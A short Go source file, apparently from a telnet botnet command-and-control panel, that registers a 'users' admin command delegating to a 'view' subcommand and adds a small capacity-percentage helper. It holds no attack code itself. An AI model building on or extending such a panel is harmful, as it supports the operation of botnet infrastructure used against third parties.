package admin

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"users"},
		Description: "Manage users from the database",
		Reseller:    true,
		Usage:       nil,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			s := command.Retrieve("users")
			cmd := command.RetrieveSubCommand("users", "view")
			if cmd == nil {
				return nil
			}
			return cmd.Executor([]string{"view"}, fx, session, s)
		},
	})

}

func winterTemp(total, used int, percent float64) bool {
	return (float64(total) - float64(used)) >= ((percent / 100.0) * float64(total))
}
